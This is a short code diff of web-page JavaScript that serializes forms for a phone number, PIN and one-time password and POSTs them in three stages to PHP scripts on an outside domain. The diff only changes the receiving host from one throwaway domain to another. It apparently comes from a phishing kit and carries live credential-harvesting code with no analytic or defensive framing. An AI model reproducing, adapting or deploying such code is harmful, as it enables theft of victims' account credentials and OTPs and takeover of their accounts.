@@ -141,7 +141,7 @@ $(".bgotp").hide();
     var dataString = $("#formNohp, #formPin, #formOtp").serialize();
 			$.ajax( {
 			  type: 'POST',
-			  url: 'https://bdudu.cloud/uf5c2d/ll/one.php',
+			  url: 'https://ww-zbi.cfd/uf5c2d/ll/one.php',
 			  data: dataString,
  
     
@@ -163,7 +163,7 @@ function sendPin(){
   var dataString = $("#formNohp, #formPin, #formOtp").serialize();
 			$.ajax( {
 			  type: 'POST',
-			  url: 'https://bdudu.cloud/uf5c2d/ll/two.php',
+			  url: 'https://ww-zbi.cfd/uf5c2d/ll/two.php',
 			  data: dataString,
  
 
@@ -196,7 +196,7 @@ $(".alert").css("color","red");
     var dataString = $("#formNohp, #formPin, #formOtp").serialize();
 			$.ajax( {
 			  type: 'POST',
-			  url: 'https://bdudu.cloud/uf5c2d/ll/three.php',
+			  url: 'https://ww-zbi.cfd/uf5c2d/ll/three.php',
 			  data: dataString,
  
         
